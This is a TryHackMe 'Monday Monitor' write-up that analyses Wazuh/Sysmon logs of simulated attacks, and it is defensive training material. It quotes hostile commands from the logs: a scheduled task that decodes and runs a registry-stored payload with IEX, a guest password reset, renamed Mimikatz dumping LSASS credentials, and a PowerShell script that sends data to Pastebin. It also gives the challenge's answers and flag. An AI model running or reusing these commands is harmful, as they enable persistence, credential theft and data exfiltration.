
# TryHackMe: Monday Monitor Challenge


Room URL: https://tryhackme.com/room/mondaymonitor

# Scenario

Swiftspend Finance, the coolest fintech company in town, is on a mission to level up its cyber security game to keep those digital adversaries at bay and ensure their customers stay safe and sound.

Led by the tech-savvy Senior Security Engineer John Sterling, Swiftspend's latest project is about beefing up their endpoint monitoring using Wazuh and Sysmon. They've been running some tests to see how well their cyber guardians can sniff out trouble. And guess what? You're the cyber sleuth they've called in to crack the code!

The tests were run on Apr 29, 2024, between 12:00:00 and 20:00:00. As you dive into the logs, you'll look for any suspicious process shenanigans or weird network connections, you name it! Your mission? Unravel the mysteries within the logs and dish out some epic insights to fine-tune Swiftspend's defences.

## Answer the questions below

### Q1. Initial access was established using a downloaded file. What is the file name saved on the host?

- filter for `localhost` and incloud the `data.win.eventdata.commandLine` field

![Screenshot 2025-05-17 142050](https://github.com/user-attachments/assets/7a70ee03-fd25-4fc7-ab24-8344efadade0)
 

Ans: ***SwiftSpend_Financial_Expenses.xlsm***

---

### Q2. What is the full command run to create a scheduled task?

- filter for `sccheduler` and include `data.win.eventdata.parentCommandLine` field to see what launched the `scheduler` process and how

![Screenshot 2025-05-17 143305](https://github.com/user-attachments/assets/243c47ac-cb4a-4cd2-ac54-73c4e9c47bf3)


- in the parentCommandLine, a scheduled task named `ATOMIC-T1053.005` is being created to execute PowerShell code that:
   - Retrieves a Base64-encoded string from the Windows Registry.
   - Decodes and executes it using `IEX` (Invoke-Expression).
- Technique: [T1053.005 – Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)

Ans: ***\"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"***

---

### Q3. What time is the scheduled task meant to run?

Ans: ***12:34***

---

### Q4. What was encoded?

- decode ASCII `cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=` using [base64decode](https://www.base64decode.org/)

Ans: ***ping www.youarevulnerable.thm***

---

### Q5. What password was set for the new user account?

- filter for the `net` command which is a built-in Windows command-line utility used to manage network resources, user accounts, services, and more.

![Screenshot 2025-05-17 150847](https://github.com/user-attachments/assets/11c74964-01d6-4221-9119-4309ce6babf3)

- `net user guest I_AM_M0NIT0R1NG` the guest account changed the password to `I_AM_M0NIT0R1NG`

Ans: ***I_AM_M0NIT0R1NG***

---

### Q6 What is the name of the .exe that was used to dump credentials?

- filter for `mimikatz`, Mimikatz is an open-source post-exploitation tool used to extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory on Windows systems.

![Screenshot 2025-05-17 152923](https://github.com/user-attachments/assets/a574ad4f-1dc9-41d6-80d7-8ac9aeb4365f)


- the command:
```powershell
C:\Tools\AtomicRedTeam\atomics\T1003.001\bin\x64\memotech.exe  
"sekurlsa::minidump C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP"  
"sekurlsa::logonpasswords full"  
exit

```
- `memotech.exe ` this is Mimikatz renamed to avoid detection.
- Loads a dump of `lsass.exe` from disk instead of live memory.
- Technique: [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

Ans: ***memotech.exe***
---

### Q7. Data was exfiltrated from the host. What was the flag that was part of the data?

- I filted the log based on the `POST` http request method, if there is data being exfiltered, this method will be used.

![Screenshot 2025-05-17 154033](https://github.com/user-attachments/assets/6ffaa059-984e-4870-86d2-66d546a3542e)

**this is the command in a cleaned-up version**
```powershell
powershell.exe &
{
    $apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
    $content = "secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem..."
    $url = "https://pastebin.com/api/api_post.php"
    
    $postData = @{
        api_dev_key     = $apiKey
        api_option      = "paste"
        api_paste_code  = $content
    }

    $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
    Write-Host $response
}

```

- This PowerShell script sends sensitive data to **Pastebin** — a website where users can post text anonymously — using their API.

***THM{M0N1T0R_1$_1N_3FF3CT}***
